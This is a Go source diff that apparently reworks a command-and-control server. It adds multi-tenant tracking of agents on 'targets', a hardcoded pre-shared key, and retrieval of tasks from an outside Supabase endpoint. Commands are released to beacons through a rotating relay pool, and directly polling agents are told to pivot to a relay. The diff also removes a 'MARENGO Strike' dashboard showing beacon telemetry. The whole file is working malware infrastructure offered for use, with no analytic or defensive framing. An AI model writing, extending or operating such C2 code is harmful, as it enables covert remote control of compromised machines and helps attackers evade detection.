@@ -3,10 +3,12 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"io"
 	"math/rand"
 	"net"
 	"net/http"
 	"os"
+	"strings"
 	"sync"
 	"time"
 )
@@ -21,23 +23,45 @@ type AuthRequest struct {
 	Arch     string `json:"arch"`
 }
 
+var (
+	taskCache = make(map[string][]byte) // target_id -> raw task body
+	cacheMu   sync.Mutex
+)
+var relayRotationIndex int
+
 type RoutingInfo struct {
 	RelayAddr string `json:"relay_addr"`
 }
 
+type TenantState struct {
+	ActiveSessions map[string]string
+	ActiveTargets  map[string]string
+	LastSeen       map[string]time.Time
+	TrafficCount   map[string]int
+	PublicIPs      map[string]string
+	NodeOS         map[string]string
+	NodeArch       map[string]string
+}
+
+func newTenantState() *TenantState {
+	return &TenantState{
+		ActiveSessions: make(map[string]string),
+		ActiveTargets:  make(map[string]string),
+		LastSeen:       make(map[string]time.Time),
+		TrafficCount:   make(map[string]int),
+		PublicIPs:      make(map[string]string),
+		NodeOS:         make(map[string]string),
+		NodeArch:       make(map[string]string),
+	}
+}
+
 var (
-	relayPoolMap   = make(map[string]time.Time)
-	relayMetadata  = make(map[string]time.Time)
-	activeSessions = make(map[string]string)
-	activeTargets  = make(map[string]string)
-	lastSeen       = make(map[string]time.Time)
-	trafficCount   = make(map[string]int)
-	publicIPs      = make(map[string]string)
-	nodeOS         = make(map[string]string)
-	nodeArch       = make(map[string]string)
-	eventLog       []string
-	mu             sync.Mutex
-	startTime      = time.Now()
+	relayPoolMap  = make(map[string]time.Time)
+	relayMetadata = make(map[string]time.Time)
+	tenants       = make(map[string]*TenantState)
+	eventLog      []string
+	mu            sync.Mutex
+	startTime     = time.Now()
 )
 
 const (
@@ -45,8 +69,15 @@ const (
 	sessionFile = "sessions_db.json"
 )
 
-// --- LOGGING (Safe Version) ---
-// This version doesn't use Mutex, so we only call it while mu is already locked.
+func getTenant(key string) *TenantState {
+	t, ok := tenants[key]
+	if !ok {
+		t = newTenantState()
+		tenants[key] = t
+	}
+	return t
+}
+
 func addLogInternal(msg string) {
 	ts := time.Now().Format("15:04:05")
 	eventLog = append([]string{"[" + ts + "] " + msg}, eventLog...)
@@ -55,7 +86,6 @@ func addLogInternal(msg string) {
 	}
 }
 
-// --- PERSISTENCE ---
 func saveState() {
 	relays := make([]string, 0, len(relayPoolMap))
 	for k := range relayPoolMap {
@@ -63,7 +93,12 @@ func saveState() {
 	}
 	rData, _ := json.Marshal(relays)
 	os.WriteFile(dbFile, rData, 0644)
-	sData, _ := json.Marshal(activeSessions)
+
+	allSessions := make(map[string]map[string]string)
+	for key, t := range tenants {
+		allSessions[key] = t.ActiveSessions
+	}
+	sData, _ := json.Marshal(allSessions)
 	os.WriteFile(sessionFile, sData, 0644)
 }
 
@@ -78,52 +113,36 @@ func loadState() {
 			relayMetadata[k] = time.Now()
 		}
 	}
-	if sData, err := os.ReadFile(sessionFile); err == nil {
-		json.Unmarshal(sData, &activeSessions)
-	}
-}
-
-// 2. KEEP THIS ONE (Global version for general use)
-func addLog(msg string) {
-	mu.Lock()
-	defer mu.Unlock()
-	addLogInternal(msg)
 }
 
 func main() {
 	rand.Seed(time.Now().UnixNano())
 	loadState()
 
-	// --- 1. THE GLOBAL REAPER ---
+	// Global reaper
 	go func() {
 		for {
 			time.Sleep(10 * time.Second)
 			mu.Lock()
-
-			for id, t := range lastSeen {
-				// 60 seconds is the sweet spot for a 10s heartbeat ghost
-				if time.Since(t) > 60*time.Second {
-					addLogInternal("TIMEOUT: Purging node " + id)
-					delete(lastSeen, id)
-					delete(activeTargets, id)
-					delete(publicIPs, id)
-					delete(nodeOS, id)
-					delete(nodeArch, id)
-					delete(activeSessions, id)
+			for _, t := range tenants {
+				for id, ts := range t.LastSeen {
+					if time.Since(ts) > 60*time.Second {
+						delete(t.LastSeen, id)
+						delete(t.ActiveTargets, id)
+						delete(t.ActiveSessions, id)
+					}
 				}
 			}
-
-			for addr, t := range relayPoolMap {
-				if time.Since(t) > 45*time.Second {
+			for addr, ts := range relayPoolMap {
+				if time.Since(ts) > 45*time.Second {
 					delete(relayPoolMap, addr)
-					delete(relayMetadata, addr)
 				}
 			}
 			mu.Unlock()
 		}
 	}()
 
-	go startAnalysisPanel()
+	// REMOVED: go startAnalysisPanel()
 
 	ln, err := net.Listen("tcp", ":8080")
 	if err != nil {
@@ -143,229 +162,159 @@ func main() {
 
 func handleConnection(conn net.Conn) {
 	defer conn.Close()
-	var req AuthRequest
-	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
-	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
 
-	if err := json.NewDecoder(conn).Decode(&req); err != nil {
+	// Set a deadline to prevent hanging connections
+	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+
+	fmt.Printf("[DEBUG] New connection attempt from: %s\n", conn.RemoteAddr())
+
+	// 1. Read the PSK (Pre-Shared Key)
+	// The agent sends 32 bytes of PSK before the JSON metadata.
+	pskBuf := make([]byte, 32)
+	n, err := conn.Read(pskBuf)
+	if err != nil {
+		fmt.Printf("[DEBUG] [%s] Error reading PSK: %v\n", conn.RemoteAddr(), err)
+		return
+	}
+
+	receivedPSK := string(pskBuf[:n])
+	expectedPSK := "8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"
+
+	if receivedPSK != expectedPSK {
+		fmt.Printf("[DEBUG] [%s] Invalid PSK received: %s\n", conn.RemoteAddr(), receivedPSK)
+		return
+	}
+	fmt.Printf("[DEBUG] [%s] PSK Verified successfully\n", conn.RemoteAddr())
+
+	// 2. Decode the JSON Metadata
+	// Note: Agent must send AuthRequest{Type, TargetID, APIKey}
+	// where APIKey is tagged as `json:"key"` in the Brain's struct
+	var req AuthRequest
+	err = json.NewDecoder(conn).Decode(&req)
+	if err != nil {
+		fmt.Printf("[DEBUG] [%s] JSON Decode Error: %v (Check if Agent uses 'key' field)\n", conn.RemoteAddr(), err)
 		return
 	}
 
 	id := req.TargetID
-	mu.Lock()
-	defer mu.Unlock()
+	key := req.Key
 
+	fmt.Printf("[DEBUG] [%s] Parsed Request - Type: %s, ID: %s, Key: %s\n", conn.RemoteAddr(), req.Type, id, key)
+
+	// 3. Handle specific request types
+	mu.Lock()
+	t := getTenant(key)
 	if id != "" {
-		trafficCount[id]++
+		t.TrafficCount[id]++
 	}
 
 	switch req.Type {
+	case "client_poll":
+		fmt.Printf("[*] POLL RECEIVED from ID: %s\n", id)
+		t.LastSeen[id] = time.Now()
+		remoteIP, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
+		mu.Unlock() // Unlock global mu for network/cache work
+
+		// 1. Check if request is from a known Relay
+		mu.Lock()
+		isFromRelay := false
+		for addr := range relayPoolMap {
+			if strings.HasPrefix(addr, remoteIP) {
+				isFromRelay = true
+				break
+			}
+		}
+
+		// Prepare selectedRelay for the Signal (Direct poll only)
+		var selectedRelay string
+		activeRelays := []string{}
+		for addr := range relayPoolMap {
+			activeRelays = append(activeRelays, addr)
+		}
+		if len(activeRelays) > 0 {
+			selectedRelay = activeRelays[relayRotationIndex%len(activeRelays)]
+			relayRotationIndex++
+		}
+		mu.Unlock()
+
+		var body []byte
+		// 2. Task Retrieval Logic (Cache vs Supabase)
+		cacheMu.Lock()
+		if isFromRelay {
+			if cachedBody, exists := taskCache[id]; exists {
+				body = cachedBody
+				delete(taskCache, id) // Clear cache after successful relay handover
+				fmt.Printf("[!] CACHE HIT: Releasing payload to Relay for %s\n", id)
+			}
+		}
+		cacheMu.Unlock()
+
+		// If not from Relay OR cache was empty, fetch from Supabase
+		if body == nil {
+			fmt.Printf("[*] FETCHING FROM SUPABASE for ID: %s\n", id)
+			supabaseURL := fmt.Sprintf("https://prodlnwtjkomsstrufqr.functions.supabase.co/task-poll?target_id=%s", id)
+			hReq, _ := http.NewRequest("GET", supabaseURL, nil)
+			hReq.Header.Set("x-api-key", key)
+
+			resp, err := (&http.Client{Timeout: 5 * time.Second}).Do(hReq)
+			if err == nil {
+				body, _ = io.ReadAll(resp.Body)
+				resp.Body.Close()
+
+				// If it's a direct poll and we found a task, CACHE IT for the relay
+				if !isFromRelay {
+					var taskCheck map[string]interface{}
+					json.Unmarshal(body, &taskCheck)
+					if taskCheck["command"] != nil && taskCheck["command"] != "" {
+						cacheMu.Lock()
+						taskCache[id] = body
+						cacheMu.Unlock()
+						fmt.Printf("[+] TASK CACHED for Relay handover: %s\n", id)
+					}
+				}
+			}
+		}
+
+		// 3. Dispatch Logic
+		var taskData map[string]interface{}
+		json.Unmarshal(body, &taskData)
+
+		if taskData["command"] != nil && taskData["command"] != "" {
+			if isFromRelay {
+				// RELAY TUNNEL: Send the real command
+				fmt.Printf("[!] PAYLOAD RELEASE: Sending '%s' to %s via Relay\n", taskData["command"], id)
+				json.NewEncoder(conn).Encode(taskData)
+			} else {
+				// DIRECT: Send signal to pivot
+				fmt.Printf("[*] SIGNAL: Forcing %s to pivot to Relay %s\n", id, selectedRelay)
+				json.NewEncoder(conn).Encode(map[string]string{
+					"status":     "signal_task_available",
+					"relay_addr": selectedRelay,
+				})
+			}
+		} else {
+			// Truly idle
+			json.NewEncoder(conn).Encode(map[string]string{"status": "idle"})
+		}
 	case "middle":
 		relayPoolMap[req.Listen] = time.Now()
 		if _, exists := relayMetadata[req.Listen]; !exists {
 			relayMetadata[req.Listen] = time.Now()
 		}
-		go saveState()
+		mu.Unlock()
+		saveState()
+		fmt.Printf("[+] RELAY UPDATED: %s\n", req.Listen)
 
 	case "client_register":
-		activeTargets[id] = req.Key
-		lastSeen[id] = time.Now()
-		publicIPs[id] = ip
-		nodeOS[id] = req.OS
-		nodeArch[id] = req.Arch
-		addLogInternal("REGISTER: " + id + " (" + req.OS + ")")
+		t.ActiveTargets[id] = key
+		t.LastSeen[id] = time.Now()
+		t.PublicIPs[id], _, _ = net.SplitHostPort(conn.RemoteAddr().String())
+		addLogInternal("REGISTER: " + id + " [" + key[:8] + "...]")
+		mu.Unlock()
+		fmt.Printf("[+] AGENT REGISTERED: %s\n", id)
 
-	case "cc_list":
-		t := make([]string, 0)
-		for tid, ts := range lastSeen {
-			// Filter list to only show nodes heartbeated within the last minute
-			if time.Since(ts) < 60*time.Second {
-				t = append(t, tid)
-			}
-		}
-		json.NewEncoder(conn).Encode(t)
-
-	case "cc_req":
-		keys := make([]string, 0, len(relayPoolMap))
-		for k, lastT := range relayPoolMap {
-			if time.Since(lastT) < 45*time.Second {
-				keys = append(keys, k)
-			}
-		}
-		if len(keys) > 0 {
-			selected := keys[rand.Intn(len(keys))]
-			activeSessions[id] = selected
-			addLogInternal(fmt.Sprintf("HOP: %s ➔ %s", id, selected))
-			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: selected})
-		} else {
-			addLogInternal("ERROR: No relays available for " + id)
-		}
-
-	case "client_poll":
-		lastSeen[id] = time.Now()
-		publicIPs[id] = ip
-		addr, exists := activeSessions[id]
-		if exists && addr != "" {
-			publicIPs[id+"_relay"] = addr
-			delete(activeSessions, id)
-			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: addr})
-		} else {
-			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: ""})
-		}
+	default:
+		mu.Unlock()
+		fmt.Printf("[DEBUG] [%s] Unknown Request Type: %s\n", conn.RemoteAddr(), req.Type)
 	}
-}
-func startAnalysisPanel() {
-	// Root Dashboard
-	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "text/html")
-		fmt.Fprint(w, `
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>MARENGO Strike // Infra-Overwatch</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-        :root { --bg: #020617; --panel: #0a1120; --border: rgba(56, 189, 248, 0.3); --accent: #38bdf8; --white: #ffffff; }
-        body { background: var(--bg); font-family: 'JetBrains Mono', monospace; color: var(--white); margin: 0; font-size: 10px; overflow: hidden; }
-        .sidebar-l { width: 220px; height: 100vh; position: fixed; left: 0; border-right: 1px solid var(--border); padding: 15px; background: var(--panel); }
-        .center-hud { margin-left: 220px; padding: 20px; height: 100vh; overflow-y: auto; transition: margin-right 0.3s; }
-        .inspect-panel { width: 0; height: 100vh; position: fixed; right: 0; top: 0; background: #0f172a; border-left: 2px solid var(--accent); overflow-y: auto; transition: width 0.3s; z-index: 100; }
-        .inspect-panel.active { width: 450px; padding: 25px; }
-        .glass { background: rgba(15, 23, 42, 0.85); border: 1px solid var(--border); padding: 12px; margin-bottom: 15px; }
-        .tunnel-row { display: flex; justify-content: space-between; padding: 15px; border: 1px solid var(--border); background: rgba(56, 189, 248, 0.03); cursor: pointer; margin-bottom: 8px; }
-        .hdr { font-weight: bold; text-transform: uppercase; color: var(--accent); border-bottom: 1px solid var(--border); margin-bottom: 15px; padding-bottom: 8px; font-size: 11px; }
-        .relay-card { border: 1px solid var(--border); padding: 10px; margin-bottom: 10px; background: rgba(255,255,255,0.02); }
-    </style>
-</head>
-<body>
-    <div class="sidebar-l">
-        <div class="hdr">SYSTEM_LOGISTICS</div>
-        <div class="mb-4">
-            <span style="font-size:8px; opacity:0.5">RELAY_FLEET_SIZE</span>
-            <div id="relay-count-nav" class="h6 text-white">0 ACTIVE</div>
-        </div>
-        <div class="mb-4">
-            <span style="font-size:8px; opacity:0.5">UPTIME</span>
-            <div id="uptime" class="h6 text-white">0s</div>
-        </div>
-    </div>
-
-    <div class="center-hud" id="main-hud">
-        <div class="hdr">LIVE_TUNNEL_MATRIX</div>
-        <div id="tunnel-matrix"></div>
-
-        <div class="hdr mt-5">GLOBAL_RELAY_INFRASTRUCTURE</div>
-        <div class="row g-2" id="global-relay-list">
-            </div>
-    </div>
-
-    <div class="inspect-panel" id="inspect-drawer">
-        <div class="hdr">BEACON_TELEMETRY</div>
-        <div id="det-id" class="fw-bold text-info mb-4">---</div>
-        <div id="det-data" class="small"></div>
-    </div>
-
-    <script>
-        async function update() {
-            try {
-                const res = await fetch('/api/metrics');
-                const data = await res.json();
-                
-                document.getElementById('uptime').innerText = data.uptime + "s";
-                document.getElementById('relay-count-nav').innerText = data.relay_stats.length + " ACTIVE";
-
-                // 1. Render Beacons
-                if (data.nodes && data.nodes.length > 0) {
-                    document.getElementById('tunnel-matrix').innerHTML = data.nodes.map(n => 
-                        '<div class="tunnel-row" onclick="inspectNode(\''+n.id+'\')">' +
-                        '<div><b>['+n.id+']</b></div><div>➔</div><div class="text-info">'+(n.relay || 'LINKING...')+'</div></div>'
-                    ).join('');
-                } else {
-                    document.getElementById('tunnel-matrix').innerHTML = '<div class="opacity-25 p-3">NO BEACONS CONNECTED</div>';
-                }
-
-                // 2. Render Relays (Fixing the "Empty" issue)
-                if (data.relay_stats && data.relay_stats.length > 0) {
-                    document.getElementById('global-relay-list').innerHTML = data.relay_stats.map(r => 
-                        '<div class="col-md-4"><div class="relay-card">' +
-                        '<div class="text-info fw-bold mb-1">' + r.addr + '</div>' +
-                        '<div class="d-flex justify-content-between opacity-75">' +
-                        '<span>UP: ' + r.uptime + 's</span><span>LOAD: ' + r.client_count + '</span>' +
-                        '</div></div></div>'
-                    ).join('');
-                } else {
-                    document.getElementById('global-relay-list').innerHTML = '<div class="col-12 opacity-25">NO RELAYS DISCOVERED</div>';
-                }
-
-            } catch(e) { console.error("Sync Error:", e); }
-        }
-
-        function inspectNode(id) {
-            document.getElementById('inspect-drawer').classList.add('active');
-            document.getElementById('det-id').innerText = "INSPECTING: " + id;
-        }
-
-        setInterval(update, 2000); update();
-    </script>
-</body></html>`)
-	})
-
-	http.HandleFunc("/api/metrics", func(w http.ResponseWriter, r *http.Request) {
-		mu.Lock()
-		defer mu.Unlock()
-
-		relayClients := make(map[string]int)
-		for _, rAddr := range activeSessions {
-			relayClients[rAddr]++
-		}
-
-		type relayInfo struct {
-			Addr        string `json:"addr"`
-			ClientCount int    `json:"client_count"`
-			Uptime      int    `json:"uptime"`
-			LastSeen    int    `json:"last_seen"`
-		}
-
-		// Pulling directly from the live map
-		relayStats := []relayInfo{}
-		for addr, lastT := range relayPoolMap {
-			relayStats = append(relayStats, relayInfo{
-				Addr:        addr,
-				ClientCount: relayClients[addr],
-				Uptime:      int(time.Since(relayMetadata[addr]).Seconds()),
-				LastSeen:    int(time.Since(lastT).Seconds()),
-			})
-		}
-
-		type nodeInfo struct {
-			ID       string `json:"id"`
-			Relay    string `json:"relay"`
-			PublicIP string `json:"public_ip"`
-		}
-
-		nodes := []nodeInfo{}
-		for id, _ := range lastSeen {
-			// Check if there is a live session OR a last-known relay
-			relayDisplay := activeSessions[id]
-			if relayDisplay == "" {
-				relayDisplay = publicIPs[id+"_relay"]
-			}
-
-			nodes = append(nodes, nodeInfo{
-				ID:       id,
-				Relay:    relayDisplay, // This will now show the actual IP instead of "Linking..."
-				PublicIP: publicIPs[id],
-			})
-		}
-
-		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(map[string]interface{}{
-			"nodes":       nodes,
-			"relay_stats": relayStats, // Ensure this matches JS 'data.relay_stats'
-			"uptime":      int(time.Since(startTime).Seconds()),
-		})
-	})
-	http.ListenAndServe(":9000", nil)
 }
